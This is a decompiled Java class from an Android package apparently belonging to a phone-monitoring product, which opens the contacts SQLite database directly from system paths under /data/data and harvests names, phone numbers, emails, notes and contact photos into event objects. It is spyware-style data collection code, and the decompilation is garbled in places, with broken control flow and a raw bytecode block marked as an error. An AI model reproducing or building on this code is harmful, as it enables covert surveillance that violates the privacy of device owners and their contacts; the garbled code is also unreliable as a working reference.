package com.vvt.addressbookmanager.b.a;

import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteException;
import android.os.Build.VERSION;
import android.os.SystemClock;
import com.vvt.ag.b;
import com.vvt.events.FxAddressBookEvent;
import java.io.File;
import java.util.ArrayList;
import java.util.Iterator;

public class a
{
  private static final boolean a = com.vvt.addressbookmanager.d.a;
  private static final boolean b = com.vvt.addressbookmanager.d.e;
  private static final File[] c;
  private static String d = null;
  
  static
  {
    File[] arrayOfFile = new File[5];
    File localFile = new java/io/File;
    localFile.<init>("/data/data/com.android.providers.contacts/databases/");
    arrayOfFile[0] = localFile;
    localFile = new java/io/File;
    localFile.<init>("/dbdata/databases/com.android.providers.contacts/");
    arrayOfFile[1] = localFile;
    localFile = new java/io/File;
    localFile.<init>("/data/data/com.motorola.blur.providers.contacts/databases/");
    arrayOfFile[2] = localFile;
    localFile = new java/io/File;
    localFile.<init>("/data/data/com.tmobile.myfaves/databases/");
    arrayOfFile[3] = localFile;
    localFile = new java/io/File;
    localFile.<init>("/data/data/com.sec.android.provider.logsprovider/databases/");
    arrayOfFile[4] = localFile;
    c = arrayOfFile;
  }
  
  public static SQLiteDatabase a()
  {
    return a(17);
  }
  
  private static SQLiteDatabase a(int paramInt)
  {
    boolean bool1 = a;
    if (bool1) {}
    Object localObject1 = d;
    Object localObject3;
    if (localObject1 == null)
    {
      localObject1 = new java/lang/StringBuilder;
      ((StringBuilder)localObject1).<init>();
      localObject2 = c;
      localObject3 = "contacts2";
      String str = "db";
      k = com.vvt.io.d.a((File[])localObject2, (String)localObject3, (StringBuilder)localObject1, str);
      boolean bool5 = a;
      if (bool5) {}
      bool5 = a;
      if ((bool5) && (k == 0)) {
        break label148;
      }
      localObject1 = ((StringBuilder)localObject1).toString();
      d = (String)localObject1;
      bool1 = a;
      if (!bool1) {}
    }
    Object localObject2 = b(paramInt);
    int i = 5;
    localObject1 = localObject2;
    int k = i;
    while ((localObject1 == null) && (k > 0))
    {
      boolean bool2 = a;
      if (bool2) {}
      long l = 1000L;
      SystemClock.sleep(l);
      localObject3 = b(paramInt);
      int j = k + -1;
      k = j;
      localObject1 = localObject3;
      continue;
      label148:
      boolean bool3 = b;
      if (bool3) {}
      bool3 = false;
      localObject1 = null;
    }
    for (;;)
    {
      return (SQLiteDatabase)localObject1;
      boolean bool4 = a;
      if (!bool4) {}
    }
  }
  
  private static FxAddressBookEvent a(long paramLong, SQLiteDatabase paramSQLiteDatabase, boolean paramBoolean)
  {
    localObject1 = null;
    int i = 2;
    int j = 1;
    boolean bool1 = a;
    if (bool1) {}
    FxAddressBookEvent localFxAddressBookEvent1 = new com/vvt/events/FxAddressBookEvent;
    localFxAddressBookEvent1.<init>();
    String str1 = c();
    localObject8 = new String[i];
    localObject8[0] = "vnd.android.cursor.item/name";
    String str2 = String.valueOf(paramLong);
    localObject8[j] = str2;
    localObject8 = paramSQLiteDatabase.rawQuery(str1, (String[])localObject8);
    String str3;
    int i2;
    int m;
    for (;;)
    {
      try
      {
        localFxAddressBookEvent1.setClientId(paramLong);
        if (localObject8 != null)
        {
          boolean bool2 = ((Cursor)localObject8).moveToFirst();
          if (bool2)
          {
            str2 = "data2";
            int k = ((Cursor)localObject8).getColumnIndex(str2);
            str2 = ((Cursor)localObject8).getString(k);
            str3 = "data3";
            i2 = ((Cursor)localObject8).getColumnIndex(str3);
            str3 = ((Cursor)localObject8).getString(i2);
            str2 = b.b(str2);
            localFxAddressBookEvent1.setFirstName(str2);
            str2 = b.b(str3);
            localFxAddressBookEvent1.setLastName(str2);
          }
        }
        if (localObject8 != null) {
          ((Cursor)localObject8).close();
        }
        localObject8 = new String[i];
        localObject8[0] = "vnd.android.cursor.item/phone_v2";
        str2 = String.valueOf(paramLong);
        localObject8[j] = str2;
        localObject8 = paramSQLiteDatabase.rawQuery(str1, (String[])localObject8);
        if (localObject8 == null) {
          break;
        }
        try
        {
          boolean bool3 = ((Cursor)localObject8).moveToFirst();
          if (!bool3) {
            break;
          }
          bool3 = ((Cursor)localObject8).isAfterLast();
          if (bool3) {
            break;
          }
          str2 = "data1";
          m = ((Cursor)localObject8).getColumnIndex(str2);
          str2 = ((Cursor)localObject8).getString(m);
          str3 = "data2";
          i2 = ((Cursor)localObject8).getColumnIndex(str3);
          i2 = ((Cursor)localObject8).getInt(i2);
          switch (i2)
          {
          default: 
            ((Cursor)localObject8).moveToNext();
            continue;
            localObject3 = finally;
          }
        }
        finally {}
        str2 = b.b(str2);
      }
      finally
      {
        if (localObject8 != null) {
          ((Cursor)localObject8).close();
        }
      }
      ((FxAddressBookEvent)localObject3).addHomePhone(str2);
      continue;
      str2 = b.b(str2);
      ((FxAddressBookEvent)localObject3).addMobilePhone(str2);
      continue;
      str2 = b.b(str2);
      ((FxAddressBookEvent)localObject3).addWorkPhone(str2);
    }
    if (localObject8 != null) {
      ((Cursor)localObject8).close();
    }
    int i3 = 2;
    for (;;)
    {
      try
      {
        localObject8 = new String[i3];
        m = 0;
        str2 = null;
        str3 = "vnd.android.cursor.item/email_v2";
        localObject8[0] = str3;
        m = 1;
        str3 = String.valueOf(paramLong);
        localObject8[m] = str3;
        localObject8 = paramSQLiteDatabase.rawQuery(str1, (String[])localObject8);
        if (localObject8 == null) {
          continue;
        }
        try
        {
          boolean bool4 = ((Cursor)localObject8).moveToFirst();
          if (!bool4) {
            continue;
          }
          bool4 = ((Cursor)localObject8).isAfterLast();
          if (bool4) {
            continue;
          }
          str2 = "data1";
          n = ((Cursor)localObject8).getColumnIndex(str2);
          str2 = ((Cursor)localObject8).getString(n);
          str3 = "data2";
          i2 = ((Cursor)localObject8).getColumnIndex(str3);
          i2 = ((Cursor)localObject8).getInt(i2);
          switch (i2)
          {
          default: 
            ((Cursor)localObject8).moveToNext();
            continue;
            if (localObject8 == null) {
              continue;
            }
          }
        }
        finally {}
      }
      finally
      {
        int n;
        boolean bool5;
        int i1;
        boolean bool6;
        int i4;
        boolean bool7 = false;
        localObject8 = null;
        continue;
      }
      ((Cursor)localObject8).close();
      throw localFxAddressBookEvent2;
      str2 = b.b(str2);
      localFxAddressBookEvent2.setHomeEMail(str2);
      continue;
      str2 = b.b(str2);
      localFxAddressBookEvent2.setWorkEMail(str2);
      continue;
      str2 = b.b(str2);
      localFxAddressBookEvent2.setOtherEMail(str2);
    }
    if (localObject8 != null) {
      ((Cursor)localObject8).close();
    }
    i3 = 2;
    try
    {
      localObject8 = new String[i3];
      n = 0;
      str2 = null;
      str3 = "vnd.android.cursor.item/note";
      localObject8[0] = str3;
      n = 1;
      str3 = String.valueOf(paramLong);
      localObject8[n] = str3;
      localObject8 = paramSQLiteDatabase.rawQuery(str1, (String[])localObject8);
      if (localObject8 != null) {}
      localObject7 = finally;
    }
    finally
    {
      for (;;)
      {
        try
        {
          bool5 = ((Cursor)localObject8).moveToFirst();
          if (bool5)
          {
            str2 = "data1";
            i1 = ((Cursor)localObject8).getColumnIndex(str2);
            str2 = ((Cursor)localObject8).getString(i1);
            localFxAddressBookEvent2.setNote(str2);
          }
          if (localObject8 != null) {
            ((Cursor)localObject8).close();
          }
          i3 = 2;
        }
        finally
        {
          localObject1 = localObject8;
          continue;
        }
        try
        {
          localObject8 = new String[i3];
          i1 = 0;
          str2 = null;
          str3 = "vnd.android.cursor.item/photo";
          localObject8[0] = str3;
          i1 = 1;
          str3 = String.valueOf(paramLong);
          localObject8[i1] = str3;
          localObject1 = paramSQLiteDatabase.rawQuery(str1, (String[])localObject8);
          if (localObject1 != null)
          {
            bool6 = ((Cursor)localObject1).moveToFirst();
            if (bool6)
            {
              localObject8 = "data15";
              i4 = ((Cursor)localObject1).getColumnIndex((String)localObject8);
              localObject8 = ((Cursor)localObject1).getBlob(i4);
              localFxAddressBookEvent2.setContactPicture((byte[])localObject8);
              ((Cursor)localObject1).close();
            }
          }
          if (localObject1 != null) {
            ((Cursor)localObject1).close();
          }
          if (paramBoolean) {}
          bool7 = a;
          if (bool7) {}
          bool7 = a;
          if (bool7) {}
          return localFxAddressBookEvent2;
        }
        finally
        {
          if (localObject1 == null) {
            continue;
          }
          ((Cursor)localObject1).close();
        }
      }
      localObject4 = finally;
      if (localObject1 != null) {
        ((Cursor)localObject1).close();
      }
    }
  }
  
  /* Error */
  public static FxAddressBookEvent a(long paramLong, boolean paramBoolean)
  {
    // Byte code:
    //   0: getstatic 16	com/vvt/addressbookmanager/removeFromPath/a/a:a	Z
    //   3: istore_3
    //   4: iload_3
    //   5: ifeq +3 -> 8
    //   8: getstatic 16	com/vvt/addressbookmanager/removeFromPath/a/a:a	Z
    //   11: istore_3
    //   12: iload_3
    //   13: ifeq +3 -> 16
    //   16: new 82	com/vvt/events/FxAddressBookEvent
    //   19: astore 4
    //   21: aload 4
    //   23: invokespecial 83	com/vvt/events/FxAddressBookEvent:<init>	()V
    //   26: invokestatic 188	com/vvt/addressbookmanager/removeFromPath/a/a:a	()Landroid/database/sqlite/SQLiteDatabase;
    //   29: astore 5
    //   31: aload 5
    //   33: ifnull +27 -> 60
    //   36: aload 5
    //   38: invokevirtual 191	android/database/sqlite/SQLiteDatabase:isDbLockedByCurrentThread	()Z
    //   41: istore 6
    //   43: iload 6
    //   45: ifne +15 -> 60
    //   48: aload 5
    //   50: invokevirtual 194	android/database/sqlite/SQLiteDatabase:isDbLockedByOtherThreads	()Z
    //   53: istore 6
    //   55: iload 6
    //   57: ifeq +36 -> 93
    //   60: getstatic 21	com/vvt/addressbookmanager/removeFromPath/a/a:removeFromPath	Z
    //   63: istore 6
    //   65: iload 6
    //   67: ifeq +3 -> 70
    //   70: aload 5
    //   72: ifnull +8 -> 80
    //   75: aload 5
    //   77: invokevirtual 195	android/database/sqlite/SQLiteDatabase:close	()V
    //   80: getstatic 16	com/vvt/addressbookmanager/removeFromPath/a/a:a	Z
    //   83: istore 7
    //   85: iload 7
    //   87: ifeq +3 -> 90
    //   90: aload 4
    //   92: areturn
    //   93: iconst_1
    //   94: istore_3
    //   95: lload_0
    //   96: aload 5
    //   98: iload_3
    //   99: invokestatic 198	com/vvt/addressbookmanager/removeFromPath/a/a:a	(JLandroid/database/sqlite/SQLiteDatabase;Z)Lcom/vvt/events/FxAddressBookEvent;
    //   102: astore 4
    //   104: aload 5
    //   106: ifnull -26 -> 80
    //   109: aload 5
    //   111: invokevirtual 195	android/database/sqlite/SQLiteDatabase:close	()V
    //   114: goto -34 -> 80
    //   117: astore 4
    //   119: aload 5
    //   121: ifnull +8 -> 129
    //   124: aload 5
    //   126: invokevirtual 195	android/database/sqlite/SQLiteDatabase:close	()V
    //   129: aload 4
    //   131: athrow
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	132	0	paramLong	long
    //   0	132	2	paramBoolean	boolean
    //   3	96	3	bool1	boolean
    //   19	84	4	localFxAddressBookEvent	FxAddressBookEvent
    //   117	13	4	localObject	Object
    //   29	96	5	localSQLiteDatabase	SQLiteDatabase
    //   41	25	6	bool2	boolean
    //   83	3	7	bool3	boolean
    // Exception table:
    //   from	to	target	type
    //   98	102	117	finally
  }
  
  private static SQLiteDatabase b(int paramInt)
  {
    SQLiteDatabase localSQLiteDatabase = null;
    try
    {
      Object localObject = new java/io/File;
      String str = d;
      ((File)localObject).<init>(str);
      boolean bool = ((File)localObject).exists();
      if (!bool) {}
      localObject = d;
      str = null;
      localSQLiteDatabase = SQLiteDatabase.openDatabase((String)localObject, null, paramInt);
    }
    catch (SQLiteException localSQLiteException)
    {
      for (;;) {}
    }
    return localSQLiteDatabase;
  }
  
  public static ArrayList b()
  {
    boolean bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    Object localObject1 = a();
    if (localObject1 != null)
    {
      bool2 = ((SQLiteDatabase)localObject1).isDbLockedByCurrentThread();
      if (!bool2)
      {
        bool2 = ((SQLiteDatabase)localObject1).isDbLockedByOtherThreads();
        if (!bool2) {
          break label62;
        }
      }
    }
    boolean bool2 = com.vvt.addressbookmanager.d.e;
    if ((!bool2) || (localObject1 != null)) {
      ((SQLiteDatabase)localObject1).close();
    }
    for (localObject1 = localArrayList;; localObject1 = localArrayList)
    {
      return (ArrayList)localObject1;
      label62:
      Object localObject2 = "contacts";
      j = 1;
      try
      {
        localObject5 = new String[j];
        String str = "_id";
        localObject5[0] = str;
        str = null;
        localObject5 = ((SQLiteDatabase)localObject1).query((String)localObject2, (String[])localObject5, null, null, null, null, null);
        if (localObject5 == null) {
          break label233;
        }
        try
        {
          bool2 = ((Cursor)localObject5).moveToFirst();
          if (!bool2) {
            break label233;
          }
          for (;;)
          {
            bool2 = ((Cursor)localObject5).isAfterLast();
            if (bool2) {
              break;
            }
            localObject2 = "_id";
            int i = ((Cursor)localObject5).getColumnIndex((String)localObject2);
            long l = ((Cursor)localObject5).getLong(i);
            localObject2 = Long.valueOf(l);
            boolean bool3 = localArrayList.contains(localObject2);
            if (!bool3)
            {
              bool3 = a;
              if (bool3) {}
              localObject2 = Long.valueOf(l);
              localArrayList.add(localObject2);
            }
            ((Cursor)localObject5).moveToNext();
          }
          if (localObject5 == null) {
            break label222;
          }
        }
        finally {}
      }
      finally
      {
        for (;;)
        {
          j = 0;
          Object localObject5 = null;
        }
      }
      ((Cursor)localObject5).close();
      label222:
      if (localObject1 != null) {
        ((SQLiteDatabase)localObject1).close();
      }
      throw ((Throwable)localObject3);
      label233:
      if (localObject5 != null) {
        ((Cursor)localObject5).close();
      }
      if (localObject1 != null) {
        ((SQLiteDatabase)localObject1).close();
      }
      bool1 = a;
      if (bool1) {}
      bool1 = a;
      if (!bool1) {}
    }
  }
  
  public static String c()
  {
    String str1 = "SELECT contacts._id, data.data1, data.data2, data.data3, data.data14, data.data15, contacts.lookup FROM data JOIN mimetypes ON(mimetype_id=mimetypes._id) JOIN contacts ON (contacts.name_raw_contact_id = data.raw_contact_id) WHERE (mimetypes.mimetype=?) AND (contacts._id = ?)";
    String str2 = "SELECT contacts._id, data.data1, data.data2, data.data3, data.data14, data.data15, contacts.lookup FROM data JOIN mimetypes ON(mimetype_id=mimetypes._id) JOIN contacts ON (contacts._id = data.raw_contact_id) WHERE (mimetypes.mimetype=?) AND (contacts._id = ?)";
    int i = d();
    int j = 7;
    if (i <= j) {}
    for (;;)
    {
      return str2;
      str2 = str1;
    }
  }
  
  public static int d()
  {
    int i = 3;
    String str1 = Build.VERSION.RELEASE;
    String str2 = "1.5";
    boolean bool = str1.startsWith(str2);
    if (bool) {}
    for (;;)
    {
      return i;
      try
      {
        i = f();
      }
      catch (VerifyError localVerifyError) {}
    }
  }
  
  public static ArrayList e()
  {
    boolean bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    Object localObject1 = b();
    boolean bool2 = a;
    if (bool2) {}
    SQLiteDatabase localSQLiteDatabase = a();
    if (localSQLiteDatabase != null)
    {
      boolean bool3 = localSQLiteDatabase.isDbLockedByCurrentThread();
      if (!bool3)
      {
        bool3 = localSQLiteDatabase.isDbLockedByOtherThreads();
        if (!bool3) {
          break label98;
        }
      }
    }
    bool1 = b;
    if ((!bool1) || (localSQLiteDatabase != null)) {
      localSQLiteDatabase.close();
    }
    for (;;)
    {
      bool1 = a;
      if (bool1) {}
      bool1 = a;
      if (bool1) {}
      return localArrayList;
      try
      {
        label98:
        Iterator localIterator = ((ArrayList)localObject1).iterator();
        for (;;)
        {
          bool1 = localIterator.hasNext();
          if (!bool1) {
            break;
          }
          localObject1 = localIterator.next();
          localObject1 = (Long)localObject1;
          long l = ((Long)localObject1).longValue();
          bool1 = false;
          localObject1 = null;
          localObject1 = a(l, localSQLiteDatabase, false);
          localArrayList.add(localObject1);
        }
        if (localSQLiteDatabase == null) {
          continue;
        }
      }
      finally
      {
        if (localSQLiteDatabase != null) {
          localSQLiteDatabase.close();
        }
      }
      localSQLiteDatabase.close();
    }
  }
  
  private static int f()
  {
    return Build.VERSION.SDK_INT;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/addressbookmanager/removeFromPath/a/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */